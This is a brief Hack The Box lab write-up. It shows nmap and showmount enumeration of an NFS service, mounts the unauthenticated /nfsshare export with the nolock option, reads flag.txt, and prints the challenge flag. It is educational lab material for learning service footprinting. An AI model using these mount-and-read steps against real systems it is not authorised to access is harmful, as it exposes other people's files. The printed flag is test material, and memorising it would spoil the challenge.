# [Challenge Name] Write-Up 🕒
> *Hack The Box*  
> *Date Solved: 2025-05-19*  
> *Category: Networking*
> *Tools Used: NFS, mount, nmap*

## Table of Contents
- [Summary](#summary)
- [Reconnaissance & Enumeration](#reconnaissance--enumeration)
- [Exploitation](#exploitation)
- [Takeaways & Lessons Learned](#takeaways--lessons-learned)

---

## Summary
We discovered an unauthenticated NFS export named nfsshare, mounted it with nolock, and pulled down the flag.txt inside—revealing our flag.

---

## Reconnaissance & Enumeration
Port scan & RPC discovery
```bash
sudo nmap -p111 -sV -sC 10.129.42.178

    Port 111/tcp open → rpcbind

    NSE rpcinfo reveals an NFS export (program 100003)
```
List available NFS exports
```bash
showmount -e 10.129.42.178

    Export list for 10.129.42.178:
```

/nfsshare 10.129.0.0/16

- Share name: `/nfsshare`  
- Exported to the internal network  

---

## Exploitation

**Create a mount point**  
```bash
mkdir -p ./target-NFS
```

Mount the NFS share
```bash
sudo mount -t nfs 10.129.42.178:/nfsshare ./target-NFS/ -o nolock
```
 -o nolock avoids locking RPC calls if lockd isn’t available

List and read the flag
```bash
    ls ./target-NFS/
    # flag.txt

    cat ./target-NFS/flag.txt
    # HTB{nfs_exposed_flag_txt}
```

---

## Takeaways & Lessons Learned
An easy CTF but I learned the basics of footprinting NFS services. 

- Always enumerate RPC services with rpcinfo and showmount after finding rpcbind.

- nolock option is useful when the server’s lock daemon isn’t responding.

- Quick wins: mounting NFS shares can yield immediate file access without credentials.